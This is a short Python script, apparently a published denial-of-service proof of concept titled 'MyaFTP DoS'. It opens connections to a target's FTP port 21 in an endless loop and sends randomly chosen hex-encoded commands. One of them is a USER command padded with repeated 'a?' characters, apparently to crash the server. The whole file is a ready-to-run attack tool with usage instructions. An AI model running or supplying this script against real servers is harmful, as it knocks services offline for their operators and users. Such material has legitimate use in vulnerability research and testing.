#!/usr/bin/python
####################
# MyaFTP DoS Python
# script.py <ip>
# Ctrl+C = Stop
# Author : G4eL
####################
import sys
import threading
import random
import re
from socket import *
####################
Host = sys.argv[1]
Port = 21
packcmd=[]

def cmd():
        global packcmd
        packcmd.append('\x48\x45\x4C\x50\x0A')
        packcmd.append('\x53\x59\x53\x54')
        packcmd.append('\x55\x53\x45\x52\x20\x61\x3f\x61\x3f\x61\x3f\x61\x3f\x61\x3f\x61\x3f\x61\x3f\x61\x3f\x61\x3f\x61\x3f\x61\x3f\x61\x3f\x61\x3f\x61\x3f\x61\x3f\x61\x3f\x61\x3f\x61\x3f\x61\x3f\x61\x3f\x61\x3f\x61')
        packcmd.append('\x50\x57\x44')
        packcmd.append('\x53\x54\x41\x54')
        return(packcmd)

while 1:
		cmd()
		s = socket(AF_INET, SOCK_STREAM)
		s.connect((Host, Port))
		s.send(random.choice(packcmd))
		s.close()
